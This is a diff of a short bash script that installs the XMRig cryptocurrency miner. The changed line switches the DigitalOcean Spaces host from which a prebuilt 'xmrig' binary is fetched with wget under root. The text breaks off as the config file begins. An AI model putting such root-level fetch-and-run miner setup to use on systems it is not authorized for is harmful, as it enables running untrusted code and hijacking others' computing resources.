@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://doublepro.nyc3.digitaloceanspaces.com/xmrig && sysctl -w vm.nr_hugepages=1024 &&
+sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://kingsize.nyc3.digitaloceanspaces.com/xmrig && sysctl -w vm.nr_hugepages=1024 &&
 
 cat > /usr/local/src/xmrig/build/config.json <<EOL
 {
